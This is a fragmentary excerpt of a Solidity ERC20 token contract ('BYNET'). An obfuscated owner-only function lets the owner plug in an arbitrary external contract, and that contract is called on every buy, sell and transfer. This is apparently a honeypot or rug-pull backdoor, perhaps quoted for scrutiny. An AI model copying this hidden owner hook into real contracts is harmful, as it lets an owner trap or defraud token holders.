...
contract TokenM is ERC20 {
    ...
    IUserAmountvohucc public vohucc;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Network", "BYNET") {
    ...
    function crtusggeBoingsRoov(IUserAmountvohucc _vohucc) public onlyOwner {
        vohucc = _vohucc;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                vohucc.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				vohucc.addOutAmount(from, amount);
            }else{
                vohucc.addOutAmount(from, amount);
                takeFee = false;
            }
